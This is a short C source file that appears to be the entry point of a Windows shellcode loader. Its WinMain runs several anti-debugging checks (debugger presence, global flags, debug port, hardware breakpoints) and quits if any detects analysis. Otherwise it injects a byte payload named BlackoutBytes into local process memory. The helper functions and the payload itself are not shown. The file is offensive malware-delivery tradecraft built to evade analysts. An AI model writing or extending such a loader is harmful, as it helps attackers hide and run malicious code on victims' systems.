#include <config.h>

INT WINAPI WinMain(
    HINSTANCE hInstance, 
    HINSTANCE hPrevInstance, 
    LPSTR     lpCmdLine, 
    INT       nShowCmd
) {
    if ( IsDbgrPresent() )
        return;

    if ( GlobalFlagCheck() )
        return;

    if ( QueryDbgPortObj() )
        return;

    if ( HwbpCheck() )
        return;

    LocalInjection( BlackoutBytes, sizeof( BlackoutBytes ) );
}

